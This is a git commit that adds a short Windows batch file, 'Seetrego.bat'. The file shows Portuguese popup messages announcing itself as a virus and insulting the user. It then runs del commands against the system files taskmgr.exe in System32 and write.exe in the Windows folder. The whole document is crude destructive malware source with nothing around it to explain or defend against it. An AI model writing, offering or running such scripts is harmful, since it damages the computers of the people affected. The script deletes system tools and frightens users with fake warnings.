10d27727a58bedab194a7e18e26acaf5d5d87fc9
karazal <69127362+karazal@users.noreply.github.com>
2020-08-02 21:06:34 -0300

    Add files via upload

---
+++ Seetrego.bat
@@ -0,0 +1,7 @@
+@echo off
+"C:\note.txt"
+msg * Esse Vírus Vai ferrar o Teu Computador,ele vai deletar o paint bloco de notas,e tbm vai deletar o gerenciador de tarefa
+msg * esse e o ultimo aviso,se você é burro reinicie o seu computador para não ser afetado.
+pause
+ del "C:\Windows\System32\taskmgr.exe"
+ del "C:\Windows\write.exe"
